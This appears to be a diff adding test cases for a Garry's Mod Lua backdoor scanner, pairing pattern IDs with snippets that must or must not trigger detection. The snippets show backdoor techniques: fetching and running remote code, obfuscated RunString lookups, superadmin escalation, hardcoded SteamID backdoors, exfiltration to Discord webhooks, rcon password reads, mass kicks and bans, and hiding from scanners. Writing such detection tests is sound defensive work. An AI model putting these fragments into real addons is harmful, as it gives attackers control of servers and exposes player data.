@@ -1,0 +1,352 @@
+# Test cases for lua_patterns.txt, executed by the self-check and by CI.
+#
+# Format:  + <ID> ;;; <lua snippet>     the snippet MUST produce that detection
+#          - <ID> ;;; <lua snippet>     the snippet MUST NOT produce it
+#
+# \n in a snippet becomes a newline. Snippets run through the real scanner, so
+# comment stripping and literal folding are exercised too.
+#
+# Every pattern needs at least one + and one - case. A new pattern without both
+# fails the self-check.
+
+# --- Direct code execution ---
++ LUA-001 ;;; RunString("print(1)")
++ LUA-001 ;;; RunStringEx(code, "identifier")
+- LUA-001 ;;; local MyRunStringHelper = 1
++ LUA-002 ;;; CompileString(code, "chunk")
+- LUA-002 ;;; local compiled = false
++ LUA-003 ;;; loadstring(payload)
+- LUA-003 ;;; local loaded = true
++ LUA-004 ;;; BroadcastLua(payload)
+- LUA-004 ;;; BroadcastLua("chat.AddText('x')")
++ LUA-005 ;;; ply:SendLua(code)
++ LUA-005 ;;; ply:SendLua(string.format(fmt, num))
+- LUA-005 ;;; ply:SendLua("GAMEMODE:ShowTeam()")
+- LUA-005 ;;; ply:SendLua( string.format( "GAMEMODE:UnfrozeObjects(%d)", num ) )
++ LUA-009 ;;; ply:SendLua( string.format( "GAMEMODE:UnfrozeObjects(%d)", num ) )
+- LUA-009 ;;; ply:ChatPrint("hello")
++ LUA-006 ;;; CompileFile("addons/x/lua/a.lua")
+- LUA-006 ;;; include("addons/x/lua/a.lua")
++ LUA-007 ;;; local runner = RunString
++ LUA-007 ;;; pcall(RunString, code)
++ LUA-007 ;;; timer.Simple(1, CompileString)
++ LUA-007 ;;; http.Fetch(url, RunString)
++ LUA-007 ;;; handlers.exec = CompileString
+- LUA-007 ;;; RunString("print(1)")
+- LUA-007 ;;; local f = _G["RunString"]
+- LUA-007 ;;; local CompileFile = CompileFile
+- LUA-007 ;;; local CompileString = CompileString
+- LUA-007 ;;; local RunString = RunString
+- LUA-007 ;;; local err = CompileString(contents, path, false)
+- LUA-007 ;;; local ok = RunString("print(1)")
++ LUA-002 ;;; local err = CompileString(contents, path, false)
++ LUA-001 ;;; local ok = RunString("print(1)")
++ LUA-008 ;;; RunString(file.Read("materials/logo.vmt", "GAME"))
++ LUA-008 ;;; local code = file.Read("sound/ui/click.txt", "GAME") CompileString(code, "x")
+- LUA-008 ;;; local cfg = file.Read("myaddon_settings.txt", "DATA")
+
+# --- Comment handling (stripped before matching) ---
+- LUA-001 ;;; -- RunString("only a comment")
+- LUA-001 ;;; --[[ old code\nRunString(x)\n]]\nprint("hi")
+- LUA-001 ;;; --[==[ RunString(x) ]==]
++ LUA-001 ;;; print("-- this is a string, not a comment") RunString(x)
+
+# --- Remote or deferred code execution ---
++ LUA-010 ;;; http.Fetch("http://x.tld/p", function(body, len) RunString(body) end)
++ LUA-010 ;;; http.Fetch("http://x.tld/p", RunString)
++ LUA-010 ;;; http.Fetch("http://x.tld/p",\n  function(body, len, headers, code)\n    RunString(body)\n  end)
++ LUA-010 ;;; HTTP({ url = u, success = function(c, body) RunString(body) end })
+- LUA-010 ;;; http.Fetch("http://x.tld/p", function(body) print(body) end)
++ LUA-011 ;;; timer.Simple(1, function() RunString(payload) end)
++ LUA-011 ;;; timer.Create("beacon", 300, 0, function() CompileString(payload, "x")() end)
+- LUA-011 ;;; timer.Simple(1, function() print("tick") end)
++ LUA-012 ;;; hook.Add("Think", "id", function() RunString(payload) end)
+- LUA-012 ;;; hook.Add("Think", "id", function() print(1) end)
++ LUA-013 ;;; net.Receive("chan", function(len, ply) RunString(net.ReadString()) end)
+- LUA-013 ;;; net.Receive("chan", function(len, ply) print(len) end)
++ LUA-014 ;;; concommand.Add("cmd", function(ply, c, a) RunString(a[1]) end)
+- LUA-014 ;;; concommand.Add("cmd", function(ply, c, a) print(c) end)
++ LUA-015 ;;; coroutine.wrap(function() RunString(payload) end)()
+- LUA-015 ;;; coroutine.wrap(function() print(1) end)()
++ LUA-016 ;;; local t = util.JSONToTable(body) RunString(t.code)
+- LUA-016 ;;; local t = util.JSONToTable(body) print(t.name)
++ LUA-017 ;;; RunString(util.Base64Decode(payload))
++ LUA-017 ;;; local code = util.Base64Decode(blob) CompileString(code, "x")
+- LUA-017 ;;; local text = util.Base64Decode(blob) print(text)
++ LUA-018 ;;; concommand.Add("cmd", function() http.Fetch(url, cb) end)
+- LUA-018 ;;; concommand.Add("cmd", function() print(1) end)
++ LUA-019 ;;; timer.Create("poll", 60, 0, function() http.Fetch(url, cb) end)
+- LUA-019 ;;; timer.Create("poll", 60, 0, function() print(1) end)
+
+# --- Environment, registry and global table ---
++ LUA-020 ;;; local env = getfenv(1)
+- LUA-020 ;;; local env = {}
++ LUA-021 ;;; setfenv(fn, sandbox)
+- LUA-021 ;;; local sandbox = {}
++ LUA-022 ;;; local _R = debug.getregistry()
+- LUA-022 ;;; local meta = FindMetaTable("Player")
++ LUA-023 ;;; debug.setlocal(2, 1, value)
+- LUA-023 ;;; local value = 1
++ LUA-024 ;;; debug.setupvalue(fn, 1, value)
+- LUA-024 ;;; local value = 1
++ LUA-025 ;;; local name, value = debug.getupvalue(fn, 1)
+- LUA-025 ;;; local name, value = "a", 1
++ LUA-026 ;;; debug.sethook(handler, "l")
+- LUA-026 ;;; local handler = function() end
++ LUA-027 ;;; _G["myGlobal"] = function() end
+- LUA-027 ;;; local t = {} t.myGlobal = function() end
++ LUA-028 ;;; local f = _G["RunString"]
++ LUA-028 ;;; local f = _G['CompileString']
++ LUA-028 ;;; local f = _G["RunStr" .. "ing"]
++ LUA-028 ;;; local f = _G[string.char(82,117,110,83,116,114,105,110,103)]
++ LUA-028 ;;; local f = _G["\x52\x75\x6e\x53\x74\x72\x69\x6e\x67"]
++ LUA-028 ;;; local f = _G[("gnirtSnuR"):reverse()]
+- LUA-028 ;;; local f = _G["MyAddonFunction"]
++ LUA-028 ;;; local f = _R["RunString"]
++ LUA-028 ;;; local f = getfenv(0)["RunString"]
++ LUA-031 ;;; getfenv(0)[name](payload)
+- LUA-028 ;;; local cfg = _R["MyAddonSettings"]
++ LUA-029 ;;; local f = _G[funcName]
+- LUA-029 ;;; local f = _G["RunString"]
++ LUA-030 ;;; rawset(_G, "hidden", value)
+- LUA-030 ;;; rawset(myTable, "key", value)
++ LUA-031 ;;; _G[name](net.ReadString())
++ LUA-031 ;;; _R[key](payload)
+- LUA-031 ;;; local f = _G[funcName]
+- LUA-031 ;;; _G["MyAddonInit"](cfg)
++ LUA-032 ;;; local n = ("RunXtring"):gsub("X", "S")
++ LUA-032 ;;; ("dcba"):reverse()
++ LUA-032 ;;; ("RunStringEx"):sub(1, 9)
+- LUA-032 ;;; FPP.Notify(ply, ("Setting %s does not exist"):format(name))
+- LUA-032 ;;; errorText = errorText .. ("    "):rep(i)
+- LUA-032 ;;; local s = text:gsub("a", "b")
+- LUA-032 ;;; print(("hello"))
+
+# --- Privilege escalation and admin takeover ---
++ LUA-040 ;;; ply:SetUserGroup("superadmin")
+- LUA-040 ;;; ply:SetUserGroup("user")
++ LUA-041 ;;; function PLAYER:IsSuperAdmin() return true end
++ LUA-041 ;;; meta.IsAdmin = function(self) return true end
+- LUA-041 ;;; if ply:IsSuperAdmin() then return end
++ LUA-042 ;;; if ply:SteamID() == "STEAM_0:1:12345678" then end
+- LUA-042 ;;; if ply:SteamID() == "STEAM_ID_PENDING" then end
++ LUA-043 ;;; ucl.addUser(ply, "superadmin")
++ LUA-043 ;;; ucl.addGroup("backdoor")
+- LUA-043 ;;; ULib.ucl.query(ply, "access")
++ LUA-044 ;;; RunConsoleCommand("sv_allowcslua", "1")
++ LUA-044 ;;; game.ConsoleCommand("ulx adduser Bob superadmin\n")
+- LUA-044 ;;; RunConsoleCommand("say", "hello")
+- LUA-044 ;;; RunConsoleCommand("sv_cheats", 1)
+- LUA-181 ;;; RunConsoleCommand("say", "hello")
++ LUA-181 ;;; RunConsoleCommand("sv_cheats", 1)
+- LUA-181 ;;; RunConsoleCommand("sv_allowcslua", "1")
++ LUA-045 ;;; RunConsoleCommand(cmd, value)
++ LUA-045 ;;; game.ConsoleCommand(buildCommand())
+- LUA-045 ;;; RunConsoleCommand("say", "hello")
+- LUA-045 ;;; ply:ChatPrint("hello")
++ LUA-046 ;;; local cv = GetConVar("sv_allowcslua")
+- LUA-046 ;;; local cv = GetConVar("sv_gravity")
++ LUA-047 ;;; local pw = GetConVar("rcon_password"):GetString()
+- LUA-047 ;;; local pw = GetConVar("sv_password"):GetString()
++ LUA-048 ;;; ply:ConCommand("connect 1.2.3.4:27015")
++ LUA-048 ;;; ply:ConCommand("unbindall")
+- LUA-048 ;;; ply:ConCommand("say hello")
+
+# --- Obfuscation ---
++ LUA-050 ;;; local key = 0xDEADBEEFCAFEBABE
+- LUA-050 ;;; local mask = 0xFF00
++ LUA-051 ;;; local s = "\x52\x75\x6e"
+- LUA-051 ;;; local s = "\x52"
++ LUA-052 ;;; local blob = "VGhlIHF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5IGRvZywgYW5kIHRoZW4gc29tZSBtb3JlIHRleHQgaGVyZS4="
+- LUA-052 ;;; local blob = "TG9yZW1JcHN1bQ=="
++ LUA-053 ;;; local blob = [[VGhlIHF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5IGRvZywgYW5kIHRoZW4gc29tZSBtb3JlIHRleHQgaGVyZS4=]]
+- LUA-053 ;;; local blob = [[short text]]
++ LUA-054 ;;; local s = string.char(72, 101, 108, 108, 111)
++ LUA-054 ;;; local s = string.char(0082,0117,0110,0083,0116,0114,0105,0110,0103)
++ LUA-054 ;;; local s = string.char(000000082,000000117,000000110,000000083,000000116)
+- LUA-054 ;;; local s = string.char(72, 101)
++ LUA-055 ;;; local s = table.concat({ string.char(65), string.char(66) })
+- LUA-055 ;;; local s = table.concat(parts, ", ")
++ LUA-056 ;;; local s = string.reverse("gnirtSnuR")
++ LUA-056 ;;; local s = ("gnirtSnuR"):reverse()
+- LUA-056 ;;; local s = "RunString"
++ LUA-057 ;;; local s = string.format("%c%c%c", 72, 73, 33)
+- LUA-057 ;;; local s = string.format("%s: %d", name, count)
++ LUA-058 ;;; local out = blob:gsub("..", function(pair) return pair end)
+- LUA-058 ;;; local out = blob:gsub("a", "b")
++ LUA-059 ;;; local c = bit.bxor(byte, key) out = out .. string.char(c)
+- LUA-059 ;;; local c = bit.bxor(flags, mask)
+
+# --- Suspicious network identifiers ---
++ LUA-060 ;;; net.Receive("a1b2c3d4e5f6a7b8c9d0a1b2c3d4e5f6a7b8c9d0", fn)
+- LUA-060 ;;; net.Receive("myAddonChannel", fn)
++ LUA-061 ;;; util.AddNetworkString("a1b2c3d4e5f6a7b8c9d0a1b2c3d4e5f6a7b8c9d0")
+- LUA-061 ;;; util.AddNetworkString("myAddonChannel")
+
+# --- Exfiltration and command-and-control ---
++ LUA-070 ;;; http.Post("https://discord.com/api/webhooks/123/abc", data)
+- LUA-070 ;;; http.Post("https://example.com/api/report", data)
++ LUA-071 ;;; http.Fetch("http://192.168.1.50/payload")
+- LUA-071 ;;; http.Fetch("http://example.com/payload")
++ LUA-072 ;;; http.Fetch("https://pastebin.com/raw/AbCdEf12")
++ LUA-072 ;;; http.Fetch("https://bit.ly/3xYzAbC")
+- LUA-072 ;;; http.Fetch("https://raw.githubusercontent.com/u/r/main/x.lua")
++ LUA-073 ;;; http.Fetch("https://raw.githubusercontent.com/u/r/main/version.txt")
+- LUA-073 ;;; http.Fetch("https://pastebin.com/raw/AbCdEf12")
+
+# --- File system ---
++ LUA-080 ;;; file.Write("backdoor.lua", code)
+- LUA-080 ;;; file.Write("myaddon_settings.txt", data)
++ LUA-081 ;;; file.Delete("myaddon_cache.txt")
+- LUA-081 ;;; file.Read("myaddon_cache.txt")
+
+# --- APIs that do not exist in Garry's Mod ---
++ LUA-090 ;;; os.execute("calc.exe")
++ LUA-090 ;;; local f = io.open("C:/x.txt", "w")
++ LUA-090 ;;; require("ffi")
++ LUA-090 ;;; ffi.cdef[[int system(const char*);]]
++ LUA-090 ;;; package.loadlib("x.dll", "luaopen_x")
+- LUA-090 ;;; local t = os.time()
+- LUA-090 ;;; local d = os.date("%H:%M")
+
+# --- Griefing and denial of service ---
++ LUA-100 ;;; game.CleanUpMap()
+- LUA-100 ;;; game.GetMap()
++ LUA-101 ;;; game.GetWorld():Remove()
++ LUA-101 ;;; Entity(0):Remove()
+- LUA-101 ;;; Entity(5):Remove()
++ LUA-102 ;;; Entity(5):Remove()
+- LUA-102 ;;; Entity(0):Remove()
++ LUA-103 ;;; for _, p in pairs(player.GetAll()) do p:Kick("bye") end
+- LUA-103 ;;; for _, p in pairs(player.GetAll()) do print(p) end
++ LUA-104 ;;; for _, p in pairs(player.GetAll()) do p:Ban(0) end
+- LUA-104 ;;; for _, p in pairs(player.GetAll()) do print(p) end
+
+# --- Self-concealment ---
++ LUA-110 ;;; file.Find = function(p, g, s) return {} end
++ LUA-110 ;;; local old = file.Read\nfile.Read = function(...) return old(...) end
+- LUA-110 ;;; local files = file.Find("lua/*", "GAME")
++ LUA-111 ;;; local old = hook.Add\nhook.Add = function(...) return old(...) end
+- LUA-111 ;;; hook.Add("Think", "x", function() end)
++ LUA-112 ;;; for name, fn in pairs(hook.GetTable()["Think"]) do print(name) end
+- LUA-112 ;;; hook.Add("Think", "x", function() end)
++ LUA-113 ;;; hook.Remove("Think", "MyAddonThink")
+- LUA-113 ;;; hook.Add("Think", "MyAddonThink", function() end)
++ LUA-114 ;;; local info = debug.getinfo(2, "Sl")
+- LUA-114 ;;; local info = { line = 1 }
++ LUA-115 ;;; timer.Remove("AntiCheatScan")
+- LUA-115 ;;; timer.Remove("ulxWhip" .. v:EntIndex())
+- LUA-115 ;;; timer.Remove("MyAddonRefresh")
+
+# --- Admin frameworks other than ULX ---
++ LUA-120 ;;; sam.player.set_rank(ply, "superadmin")
++ LUA-120 ;;; serverguard.player:SetRank(ply, "owner")
+- LUA-120 ;;; ply:SetUserGroup("superadmin")
++ LUA-121 ;;; RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "superadmin")
++ LUA-121 ;;; RunConsoleCommand( "ulx", "adduserid", "STEAM_0:0:50535096", "superadmin" )
++ LUA-121 ;;; game.ConsoleCommand("ulx", "addgroup", name)
+- LUA-121 ;;; RunConsoleCommand("ulx", "thetime")
+- LUA-121 ;;; RunConsoleCommand("say", "adduserid")
++ LUA-122 ;;; ULib.unban( "STEAM_0:1:56102047")
++ LUA-122 ;;; RunConsoleCommand("ulx", "unban", id)
+- LUA-122 ;;; ULib.query("SELECT 1")
++ LUA-132 ;;; if ( ply:IsAdmin() or ply:SteamID() == "STEAM_0:1:33966080") then
++ LUA-132 ;;; if ply:SteamID() == "STEAM_0:1:33966080" or ply:IsSuperAdmin() then
+- LUA-132 ;;; if ply:IsAdmin() or ply:IsSuperAdmin() then
+- LUA-132 ;;; if ply:SteamID() == owner then
+
+# --- Inverted permission checks ---
++ LUA-130 ;;; if not ply:IsAdmin() then RunString(payload) end
++ LUA-130 ;;; if not ply:IsSuperAdmin() then ply:SetUserGroup("superadmin") end
+- LUA-130 ;;; if not ply:IsAdmin() then return end\nRunString(payload)
+- LUA-130 ;;; if ply:IsAdmin() then RunString(payload) end
++ LUA-001 ;;; if not ply:IsAdmin() then return end\nRunString(payload)
++ LUA-001 ;;; if ply:IsAdmin() then RunString(payload) end
++ LUA-131 ;;; if ply:SteamID() ~= "STEAM_0:1:12345678" then ply:Kick("no") end
+- LUA-131 ;;; if ply:SteamID() == "STEAM_0:1:12345678" then print("owner") end
++ LUA-135 ;;; local e = ents.Create("env_explosion")
++ LUA-135 ;;; bomb:Fire("Explode", "", 0)
+- LUA-135 ;;; local e = ents.Create("prop_physics")
+- LUA-135 ;;; ent:Fire("Kill", "", 0)
++ LUA-136 ;;; hook.Add("PlayerKick", "PreventBan", prevent_ban)
++ LUA-136 ;;; hook.Add( "PlayerBan", "x", function() return false end )
+- LUA-136 ;;; hook.Add("PlayerSpawn", "x", fn)
++ LUA-137 ;;; concommand.Add( "bs_scan", FuckOff )
++ LUA-137 ;;; concommand.Add("nomalua_scan", noop)
+- LUA-137 ;;; concommand.Add("myaddon_scan", handler)
++ LUA-138 ;;; concommand.Remove( "rp_resetallmoney" )
+- LUA-138 ;;; concommand.Add("thing", fn)
++ LUA-139 ;;; local data = render.Capture(tab)
++ LUA-139 ;;; local grab = render_Capture or render.Capture
+- LUA-139 ;;; render.DrawLine(a, b)
+
+# --- Time-delayed activation ---
++ LUA-140 ;;; if os.time() > 1893456000 then RunString(payload) end
++ LUA-140 ;;; if os.time() >= 1800000000 then activate() end
+- LUA-140 ;;; local now = os.time()\nif now > lastCheck then lastCheck = now end
+
+# --- Persistence ---
++ LUA-150 ;;; local row = sql.QueryValue("SELECT v FROM cfg")\nRunString(row)
++ LUA-150 ;;; sql.Query("INSERT INTO cfg VALUES('x')")\nCompileString(code, "n")
+- LUA-150 ;;; sql.Query("CREATE TABLE IF NOT EXISTS cfg(k, v)")
++ LUA-151 ;;; file.Write("gen/style.txt", css)\nresource.AddFile("gen/style.txt")
+- LUA-151 ;;; resource.AddFile("materials/logo.png")
++ LUA-152 ;;; AddCSLuaFile("data/payload.lua")
+- LUA-152 ;;; AddCSLuaFile("myaddon/cl_init.lua")
++ LUA-153 ;;; sql.Query("SELECT * FROM players WHERE name = '" .. name .. "'")
+- LUA-153 ;;; sql.Query("SELECT * FROM players")
+- LUA-153 ;;; sql.Query("UPDATE t SET name = " .. sql.SQLStr(ply:Nick()) .. " WHERE id = " .. sql.SQLStr(id) .. ";")
+- LUA-153 ;;; sql.Query("SELECT " .. "a, b" .. " FROM t")
++ LUA-153 ;;; sql.Query("UPDATE t SET " .. column .. " = 1")
+- LUA-153 ;;; sql.Query("SELECT * FROM t WHERE map = " .. MySQLite.SQLStr(map))
+- LUA-153 ;;; sql.Query([[UPDATE t SET ]] .. [[x = 1]])
+
+# --- Exfiltration ---
++ LUA-160 ;;; http.Post(url, { id = ply:SteamID64() })
++ LUA-160 ;;; local id = ply:SteamID()\nhttp.Fetch(base .. id)
+- LUA-160 ;;; local id = ply:SteamID()\nprint(id)
++ LUA-161 ;;; local blob = util.Base64Encode(data)\nhttp.Post(url, { d = blob })
+- LUA-161 ;;; local blob = util.Base64Encode(data)\nfile.Write("cache.txt", blob)
++ LUA-162 ;;; local os = system.IsWindows()
++ LUA-162 ;;; local ip = game.GetIPAddress()
+- LUA-162 ;;; local name = game.GetMap()
+
+# --- Economy ---
++ LUA-170 ;;; ply:addMoney(999999999)
++ LUA-170 ;;; ply:setDarkRPVar("money", 100000000)
+- LUA-170 ;;; ply:addMoney(500)
++ LUA-171 ;;; DarkRP.createEntity("Thing", { cmd = "thing", ent = "x", model = "m", price = 1, RunString = RunString(payload) })
+- LUA-171 ;;; DarkRP.createEntity("Thing", { cmd = "thing", ent = "x", model = "m", price = 1 })
+
+# --- Path-scoped ---
++ LUA-180 ;;; file.Write("myaddon/cache.txt", data)
+- LUA-180 ;;; local data = file.Read("myaddon/cache.txt")
++ LUA-182 ;;; local chunk = "\27LuaQ\0\1\4\4" .. rest
+- LUA-182 ;;; local header = "LuaJIT 2.1 is the runtime"
++ LUA-183 ;;; RunString(util.Decompress(payload))
++ LUA-183 ;;; local src = util.Decompress(blob)\nRunString(src)
+- LUA-183 ;;; net.WriteData(util.Compress(util.TableToJSON(stats)))
+- LUA-183 ;;; local text = util.Decompress(file.Read("cache.dat"))
+- LUA-183 ;;; savedata = util.Decompress(savedata)\nif (!isstring(savedata)) then MsgN("gm_load: Couldn't load save!") return end\nLoadGModSave(savedata)
++ LUA-184 ;;; local blob = string.dump(payload)
+- LUA-184 ;;; local blob = util.TableToJSON(payload)
++ LUA-185 ;;; local bc = jit.util.funcbc(fn, 0)
+- LUA-185 ;;; if jit then print(jit.version) end
++ LUA-186 ;;; local src = util.Decompress(util.Base64Decode(blob))
+- LUA-186 ;;; local src = util.Decompress(net.ReadData(len))
++ LUA-187 ;;; sound.PlayURL(url, "mono", function(ch) ch:Play() end)
+- LUA-187 ;;; surface.PlaySound("buttons/button15.wav")
++ LUA-001 ;;; RunString"print(1)"
++ LUA-001 ;;; RunString[[print(1)]]
++ LUA-001 ;;; RunString [==[print(1)]==]
++ LUA-002 ;;; CompileString'print(1)'
++ LUA-003 ;;; loadstring[[print(1)]]
++ LUA-006 ;;; CompileFile"lua/autorun/x.lua"
++ LUA-188 ;;; local chunk = load(payload)
++ LUA-188 ;;; if load then f = load(body) else f = loadstring(body) end
+- LUA-188 ;;; local loaded = true
+- LUA-188 ;;; self:load(path)
+- LUA-188 ;;; material_library.load(name)
+- LUA-188 ;;; menu:AddOption("auto load (your spawn outfit)", fn)
+- LUA-188 ;;; OpenOldTabs:SetText("Open old tabs on load")
+- LUA-188 ;;; frame:SetTitle("Menu failed to load")
